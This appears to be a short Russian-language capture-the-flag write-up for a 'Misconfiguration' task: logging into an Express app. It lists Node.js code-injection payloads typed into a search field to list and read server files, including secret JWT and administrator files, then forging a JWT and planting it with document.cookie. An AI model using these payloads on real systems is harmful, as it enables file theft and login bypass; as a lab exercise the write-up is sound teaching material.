# Misconfiguration

Задача: необходимо авторизироваться в системе.

### Решение
1. Через вкладку `network` в браузере, можно посомтреть какие запросы мы посылаем на сервере, и оттуда можно узнать на каком фреймворке написан сервер - `express`.
2. По ошибкам, приходящим с сервера, можно понять, что в поле поиска находится code-инъекция.
3. Читаем файлы, которые находятся на сервере:
```
res.json(require("fs").readdirSync("./"))
res.json(require("fs").readdirSync("./secret-files"))
res.end(require("fs").readFileSync("./secret-files/jwt.txt"))
res.end(require("fs").readFileSync("./secret-files/administrators.txt"))
res.end(require("fs").readFileSync("./generate-access-token.js"))
```
В `jwt.txt` описывается хранение `JWT` в браузере. <br />
В `administrators.txt` расположены имена пользователей администраторов.
4. Сгенерировать `JWT` с помощью кода, который можно взять из файла `generate-access-token.js`. <br />
5. Прикрепить токен к браузеру через веб-консоль: `document.cookie="accessToken=yourtoken"`. <br />
6. Перезагрузить страницу или попробовать перейти на страницу `sign-in` или сделать поиск с кодом, который не вызовет ошибку на сервере при поиске файла.
